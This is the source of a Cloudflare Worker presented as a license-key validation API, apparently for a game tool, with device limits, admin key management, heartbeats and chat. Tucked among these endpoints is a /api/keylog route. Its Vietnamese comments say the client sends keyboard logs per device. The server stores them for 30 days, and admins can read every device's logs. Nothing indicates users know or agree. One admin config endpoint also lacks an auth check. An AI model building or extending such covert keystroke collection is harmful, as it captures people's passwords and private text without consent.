/**
 * Cloudflare Worker — Key Validate API v3
 * Per-device feature permissions, device naming, note editing
 */

export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, X-Auth-Key, X-Device-ID, X-Admin-Token',
    };

    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    // ── GET /api/validate ──────────────────────────────────────────────────
    if (url.pathname === '/api/validate') {
      const key      = request.headers.get('X-Auth-Key')  || url.searchParams.get('key');
      const deviceID = request.headers.get('X-Device-ID') || url.searchParams.get('device');

      if (!key) return json({ status: 'invalid', message: 'Missing key' }, corsHeaders);

      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ status: 'deleted', message: 'Key not found' }, corsHeaders);

      let record;
      try { record = JSON.parse(raw); } catch {
        return json({ status: 'invalid', message: 'Corrupt record' }, corsHeaders);
      }

      if (record.status === 'banned')
        return json({ status: 'banned', message: 'Key is banned', role: record.role }, corsHeaders);

      const now = new Date();
      if (new Date(record.expiresAt) < now) {
        record.status = 'expired';
        await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
        return json({ status: 'expired', message: 'Key expired', role: record.role, days_left: 0 }, corsHeaders);
      }

      // Device management
      const devices = record.devices || [];
      let currentDevice = null;

      if (deviceID) {
        currentDevice = devices.find(d => d.id === deviceID);
        if (!currentDevice) {
          if (devices.length >= record.maxDevices) {
            return json({
              status: 'device_limit',
              message: `Key đã đạt giới hạn ${record.maxDevices} thiết bị`,
              role: record.role
            }, corsHeaders);
          }
          currentDevice = {
            id: deviceID,
            name: '',
            firstSeen: now.toISOString(),
            lastSeen:  now.toISOString(),
            blocked_features: []
          };
          devices.push(currentDevice);
        } else {
          currentDevice.lastSeen = now.toISOString();
          // Ensure blocked_features field exists on old devices
          if (!currentDevice.blocked_features) currentDevice.blocked_features = [];
        }
        record.devices = devices;
        await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      }

      const daysLeft = Math.ceil((new Date(record.expiresAt) - now) / 86400000);
      const deviceBlocked = currentDevice ? (currentDevice.blocked_features || []) : [];

      return json({
        status:           'valid',
        role:             record.role,
        days_left:        daysLeft,
        expires:          record.expiresAt,
        blocked_features: deviceBlocked,      // per-device blocked list
        banner_config:    record.banner_config || null, // per-key banner text
        message:          'OK'
      }, corsHeaders);
    }

    // ── GET /api/admin/list ────────────────────────────────────────────────
    if (url.pathname === '/api/admin/list') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN)
        return json({ error: 'Unauthorized' }, corsHeaders, 401);

      // Lấy danh sách online devices
      const onlineListed = await env.KEYS_KV.list({ prefix: 'online:' });
      const onlineSet = new Set();
      for (const item of onlineListed.keys) {
        const raw = await env.KEYS_KV.get(item.name);
        if (raw) {
          try { const o = JSON.parse(raw); if (o.deviceID) onlineSet.add(o.deviceID); } catch {}
        }
      }

      // Lấy unread chat counts
      const chatListed = await env.KEYS_KV.list({ prefix: 'chat:' });
      const unreadMap = {}; // deviceID -> unreadCount (tin nhắn user chưa được admin đọc)
      for (const item of chatListed.keys) {
        const raw = await env.KEYS_KV.get(item.name);
        if (raw) {
          try {
            const c = JSON.parse(raw);
            const unread = (c.messages || []).filter(m => m.from === 'user' && !m.readByAdmin).length;
            if (unread > 0) unreadMap[c.deviceID] = unread;
          } catch {}
        }
      }

      const listed = await env.KEYS_KV.list({ prefix: 'key:' });
      const allKeys = [];

      for (const item of listed.keys) {
        const raw = await env.KEYS_KV.get(item.name);
        if (!raw) continue;
        try {
          const record = JSON.parse(raw);
          const now = new Date();
          if (record.status === 'valid' && new Date(record.expiresAt) < now) {
            record.status = 'expired';
            await env.KEYS_KV.put(item.name, JSON.stringify(record));
          }
          const devices = (record.devices || []).map(d => ({
            id:               d.id,
            name:             d.name || '',
            firstSeen:        d.firstSeen,
            lastSeen:         d.lastSeen,
            blocked_features: d.blocked_features || [],
            online:           onlineSet.has(d.id),
            unreadCount:      unreadMap[d.id] || 0
          }));
          const onlineDevices = devices.filter(d => d.online).length;
          allKeys.push({
            key:           record.key,
            role:          record.role,
            status:        record.status,
            maxDevices:    record.maxDevices,
            usedDevices:   devices.length,
            onlineDevices,
            devices,
            createdAt:     record.createdAt,
            expiresAt:     record.expiresAt,
            note:          record.note || '',
            banner_config: record.banner_config || null
          });
        } catch {}
      }

      allKeys.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
      return json({ keys: allKeys, total: allKeys.length }, corsHeaders);
    }

    // ── POST /api/admin/create ─────────────────────────────────────────────
    if (url.pathname === '/api/admin/create' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN)
        return json({ error: 'Unauthorized' }, corsHeaders, 401);

      const body = await request.json();
      const { key, role, maxDevices, expiresAt, note } = body;
      if (!key || !expiresAt)
        return json({ error: 'Missing required fields (key, expiresAt)' }, corsHeaders, 400);

      const existing = await env.KEYS_KV.get(`key:${key}`);
      if (existing) return json({ error: 'Key already exists' }, corsHeaders, 409);

      const record = {
        key, role: role || 'member', status: 'valid',
        maxDevices: maxDevices || 1, devices: [],
        createdAt: new Date().toISOString(), expiresAt, note: note || ''
      };
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true, key }, corsHeaders);
    }

    // ── POST /api/admin/ban ────────────────────────────────────────────────
    if (url.pathname === '/api/admin/ban' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key } = await request.json();
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      record.status = 'banned';
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/admin/unban ──────────────────────────────────────────────
    if (url.pathname === '/api/admin/unban' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key } = await request.json();
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      record.status = new Date(record.expiresAt) > new Date() ? 'valid' : 'expired';
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true, status: record.status }, corsHeaders);
    }

    // ── POST /api/admin/delete ─────────────────────────────────────────────
    if (url.pathname === '/api/admin/delete' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key } = await request.json();
      await env.KEYS_KV.delete(`key:${key}`);
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/admin/renew ──────────────────────────────────────────────
    if (url.pathname === '/api/admin/renew' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key, addDays } = await request.json();
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      const base = new Date(record.expiresAt) > new Date() ? new Date(record.expiresAt) : new Date();
      record.expiresAt = new Date(base.getTime() + addDays * 86400000).toISOString();
      if (record.status === 'expired') record.status = 'valid';
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true, expiresAt: record.expiresAt }, corsHeaders);
    }

    // ── POST /api/admin/setrole ────────────────────────────────────────────
    if (url.pathname === '/api/admin/setrole' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key, role } = await request.json();
      if (!key || !['admin', 'member'].includes(role))
        return json({ error: 'Invalid params' }, corsHeaders, 400);
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      record.role = role;
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true, key, role }, corsHeaders);
    }

    // ── POST /api/admin/setnote ────────────────────────────────────────────
    // Sửa ghi chú cho key
    if (url.pathname === '/api/admin/setnote' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key, note } = await request.json();
      if (!key) return json({ error: 'Missing key' }, corsHeaders, 400);
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      record.note = note || '';
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/admin/setdevicename ──────────────────────────────────────
    // Đặt tên thiết bị
    if (url.pathname === '/api/admin/setdevicename' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key, deviceId, name } = await request.json();
      if (!key || !deviceId) return json({ error: 'Missing key/deviceId' }, corsHeaders, 400);
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      const device = (record.devices || []).find(d => d.id === deviceId);
      if (!device) return json({ error: 'Device not found' }, corsHeaders, 404);
      device.name = name || '';
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/admin/setdeviceperms ─────────────────────────────────────
    // Khóa/mở chức năng theo từng thiết bị
    if (url.pathname === '/api/admin/setdeviceperms' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key, deviceId, blocked_features } = await request.json();
      if (!key || !deviceId || !Array.isArray(blocked_features))
        return json({ error: 'Invalid params' }, corsHeaders, 400);
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      const device = (record.devices || []).find(d => d.id === deviceId);
      if (!device) return json({ error: 'Device not found' }, corsHeaders, 404);
      device.blocked_features = blocked_features;
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true, deviceId, blocked_features }, corsHeaders);
    }


    // ── POST /api/admin/setkeybanner ───────────────────────────────────────
    // Lưu banner_config riêng theo từng key
    if (url.pathname === '/api/admin/setkeybanner' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { key, banner_config } = await request.json();
      if (!key || typeof banner_config !== 'object')
        return json({ error: 'Invalid params' }, corsHeaders, 400);
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      record.banner_config = banner_config;
      await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
      return json({ success: true, key, banner_config }, corsHeaders);
    }

    // ── GET /api/getkeybanner ──────────────────────────────────────────────
    // Public endpoint: source LQ_OBJ gọi sau khi validate key để lấy banner riêng
    if (url.pathname === '/api/getkeybanner') {
      const key = request.headers.get('X-Auth-Key') || url.searchParams.get('key');
      if (!key) return json({ error: 'Missing key' }, corsHeaders, 400);
      const raw = await env.KEYS_KV.get(`key:${key}`);
      if (!raw) return json({ error: 'Not found' }, corsHeaders, 404);
      const record = JSON.parse(raw);
      return json({ banner_config: record.banner_config || null }, corsHeaders);
    }

    // ── GET /api/admin/getconfig ────────────────────────────────────────────
    if (url.pathname === '/api/admin/getconfig') {
      const raw = await env.KEYS_KV.get('global:banner_config');
      const cfg = raw ? JSON.parse(raw) : {};
      return json({ banner_config: cfg }, corsHeaders);
    }

    // ── POST /api/admin/setconfig ───────────────────────────────────────────
    if (url.pathname === '/api/admin/setconfig' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const body = await request.json();
      if (body.banner_config) {
        await env.KEYS_KV.put('global:banner_config', JSON.stringify(body.banner_config));
      }
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/keylog ───────────────────────────────────────────────────
    // Source LQ_OBJ gửi log bàn phím theo device ID (debounce 1.5s phía client)
    // Mỗi POST là 1 "cụm gõ" riêng — không gộp tại server
    if (url.pathname === '/api/keylog' && request.method === 'POST') {
      let body;
      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { deviceID, key, line } = body;
      if (!deviceID || !line) return json({ error: 'Missing deviceID or line' }, corsHeaders, 400);

      const storageKey = `keylog:${deviceID}`;
      const raw = await env.KEYS_KV.get(storageKey);
      let record = raw ? JSON.parse(raw) : { deviceID, authKey: key || '', lines: [] };

      // Mỗi entry là 1 dòng độc lập (real-time, không gộp)
      const now = new Date();
      const cleanLine = (line || '').trim().replace(/\n/g, '↵').replace(/\r/g, '');
      if (cleanLine.length > 0) {
        record.lines.push({ text: cleanLine, ts: now.toISOString() });
        // Giữ tối đa 500 dòng gần nhất
        if (record.lines.length > 500) record.lines = record.lines.slice(-500);
      }

      record.authKey = key || record.authKey;
      await env.KEYS_KV.put(storageKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 30 });
      return json({ success: true }, corsHeaders);
    }

    // ── GET /api/admin/keylog ──────────────────────────────────────────────
    // Lấy log bàn phím của 1 device cụ thể hoặc tất cả
    if (url.pathname === '/api/admin/keylog') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);

      const deviceID = url.searchParams.get('device');
      if (deviceID) {
        const raw = await env.KEYS_KV.get(`keylog:${deviceID}`);
        if (!raw) return json({ deviceID, lines: [] }, corsHeaders);
        return json(JSON.parse(raw), corsHeaders);
      }

      // Lấy tất cả keylog
      const listed = await env.KEYS_KV.list({ prefix: 'keylog:' });
      const all = [];
      for (const item of listed.keys) {
        const raw = await env.KEYS_KV.get(item.name);
        if (raw) { try { all.push(JSON.parse(raw)); } catch {} }
      }
      return json({ logs: all, total: all.length }, corsHeaders);
    }

    // ── POST /api/admin/clearlog ───────────────────────────────────────────
    // Xóa log bàn phím của 1 thiết bị
    if (url.pathname === '/api/admin/clearlog' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { deviceID } = await request.json();
      if (!deviceID) return json({ error: 'Missing deviceID' }, corsHeaders, 400);
      await env.KEYS_KV.delete(`keylog:${deviceID}`);
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/heartbeat ────────────────────────────────────────────────
    // Game gọi mỗi 30s để báo đang online, TTL 90s
    if (url.pathname === '/api/heartbeat' && request.method === 'POST') {
      let body;
      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { deviceID, key } = body;
      if (!deviceID) return json({ error: 'Missing deviceID' }, corsHeaders, 400);

      // Cập nhật lastSeen trên record key
      if (key) {
        const raw = await env.KEYS_KV.get(`key:${key}`);
        if (raw) {
          try {
            const record = JSON.parse(raw);
            const device = (record.devices || []).find(d => d.id === deviceID);
            if (device) {
              device.lastSeen = new Date().toISOString();
              await env.KEYS_KV.put(`key:${key}`, JSON.stringify(record));
            }
          } catch {}
        }
      }

      // Lưu trạng thái online với TTL 90s
      await env.KEYS_KV.put(`online:${deviceID}`, JSON.stringify({
        deviceID, key: key || '', ts: new Date().toISOString()
      }), { expirationTtl: 90 });

      // Trả về tin nhắn chờ từ admin (nếu có)
      const chatRaw = await env.KEYS_KV.get(`chat:${deviceID}`);
      let pendingMessages = [];
      if (chatRaw) {
        try {
          const chatRecord = JSON.parse(chatRaw);
          pendingMessages = (chatRecord.messages || []).filter(m => m.from === 'admin' && !m.readByUser);
        } catch {}
      }

      return json({ success: true, pendingMessages }, corsHeaders);
    }

    // ── POST /api/offline ──────────────────────────────────────────────────
    // Game gọi khi thoát, xóa online ngay lập tức
    if (url.pathname === '/api/offline' && request.method === 'POST') {
      let body;
      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { deviceID } = body;
      if (!deviceID) return json({ error: 'Missing deviceID' }, corsHeaders, 400);
      await env.KEYS_KV.delete(`online:${deviceID}`);
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/chat/send ────────────────────────────────────────────────
    // User (game) gửi tin nhắn cho admin
    if (url.pathname === '/api/chat/send' && request.method === 'POST') {
      let body;
      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
      const { deviceID, key, message } = body;
      if (!deviceID || !message) return json({ error: 'Missing deviceID or message' }, corsHeaders, 400);

      const storageKey = `chat:${deviceID}`;
      const raw = await env.KEYS_KV.get(storageKey);
      let record = raw ? JSON.parse(raw) : { deviceID, key: key || '', messages: [] };

      record.messages.push({
        id: Date.now(),
        from: 'user',
        text: message,
        ts: new Date().toISOString(),
        readByAdmin: false,
        readByUser: true
      });
      // Giữ tối đa 200 tin
      if (record.messages.length > 200) record.messages = record.messages.slice(-200);
      record.key = key || record.key;

      await env.KEYS_KV.put(storageKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 30 });
      return json({ success: true }, corsHeaders);
    }

    // ── GET /api/chat/messages ─────────────────────────────────────────────
    // User (game) poll tin nhắn từ admin, auto mark readByUser
    if (url.pathname === '/api/chat/messages') {
      const deviceID = request.headers.get('X-Device-ID') || url.searchParams.get('device');
      if (!deviceID) return json({ error: 'Missing deviceID' }, corsHeaders, 400);

      const storageKey = `chat:${deviceID}`;
      const raw = await env.KEYS_KV.get(storageKey);
      if (!raw) return json({ messages: [], hideReadStatus: false }, corsHeaders);

      const record = JSON.parse(raw);
      let changed = false;
      (record.messages || []).forEach(m => {
        if (m.from === 'admin' && !m.readByUser) { m.readByUser = true; changed = true; }
      });
      if (changed) await env.KEYS_KV.put(storageKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 30 });

      // Trả thêm hideReadStatus để game menu biết có cần ẩn trạng thái "Đã xem" không
      return json({ messages: record.messages || [], hideReadStatus: record.hideReadStatus === true }, corsHeaders);
    }

    // ── GET /api/admin/chat ────────────────────────────────────────────────
    // Admin xem chat của 1 device, auto mark readByAdmin
    if (url.pathname === '/api/admin/chat') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);

      const deviceID = url.searchParams.get('device');
      if (!deviceID) return json({ error: 'Missing device' }, corsHeaders, 400);

      const storageKey = `chat:${deviceID}`;
      const raw = await env.KEYS_KV.get(storageKey);
      if (!raw) return json({ messages: [] }, corsHeaders);

      const record = JSON.parse(raw);
      let changed = false;
      (record.messages || []).forEach(m => {
        if (m.from === 'user' && !m.readByAdmin) { m.readByAdmin = true; changed = true; }
      });
      if (changed) await env.KEYS_KV.put(storageKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 30 });

      return json({ messages: record.messages || [], hideReadStatus: record.hideReadStatus === true }, corsHeaders);
    }

    // ── POST /api/admin/chat/reply ─────────────────────────────────────────
    // Admin gửi tin nhắn trả lời cho user
    if (url.pathname === '/api/admin/chat/reply' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);

      const { deviceID, message } = await request.json();
      if (!deviceID || !message) return json({ error: 'Missing deviceID or message' }, corsHeaders, 400);

      const storageKey = `chat:${deviceID}`;
      const raw = await env.KEYS_KV.get(storageKey);
      let record = raw ? JSON.parse(raw) : { deviceID, key: '', messages: [] };

      record.messages.push({
        id: Date.now(),
        from: 'admin',
        text: message,
        ts: new Date().toISOString(),
        readByAdmin: true,
        readByUser: false
      });
      if (record.messages.length > 200) record.messages = record.messages.slice(-200);

      await env.KEYS_KV.put(storageKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 30 });
      return json({ success: true }, corsHeaders);
    }

    // ── POST /api/admin/chat/sethideread ──────────────────────────────────
    // Admin bật/tắt ẩn trạng thái "Đã xem" cho user (lưu vào chat record)
    if (url.pathname === '/api/admin/chat/sethideread' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { deviceID, hideReadStatus } = await request.json();
      if (!deviceID) return json({ error: 'Missing deviceID' }, corsHeaders, 400);
      const storageKey = `chat:${deviceID}`;
      const raw = await env.KEYS_KV.get(storageKey);
      let record = raw ? JSON.parse(raw) : { deviceID, key: '', messages: [] };
      record.hideReadStatus = hideReadStatus === true;
      await env.KEYS_KV.put(storageKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 30 });
      return json({ success: true, hideReadStatus: record.hideReadStatus }, corsHeaders);
    }

    // ── POST /api/admin/chat/clear ─────────────────────────────────────────
    // Admin xóa toàn bộ chat của 1 device
    if (url.pathname === '/api/admin/chat/clear' && request.method === 'POST') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
      const { deviceID } = await request.json();
      if (!deviceID) return json({ error: 'Missing deviceID' }, corsHeaders, 400);
      await env.KEYS_KV.delete(`chat:${deviceID}`);
      return json({ success: true }, corsHeaders);
    }

    // ── GET /api/admin/list (updated) ─────────────────────────────────────
    // Note: already handled above, but we inject online status here via /api/admin/online
    // ── GET /api/admin/online ──────────────────────────────────────────────
    // Trả về danh sách device đang online
    if (url.pathname === '/api/admin/online') {
      const adminToken = request.headers.get('X-Admin-Token');
      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);

      const listed = await env.KEYS_KV.list({ prefix: 'online:' });
      const onlineDevices = [];
      for (const item of listed.keys) {
        const raw = await env.KEYS_KV.get(item.name);
        if (raw) {
          try { onlineDevices.push(JSON.parse(raw)); } catch {}
        }
      }
      return json({ onlineDevices, total: onlineDevices.length }, corsHeaders);
    }

  }
};

function json(data, headers = {}, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json', ...headers }
  });
}
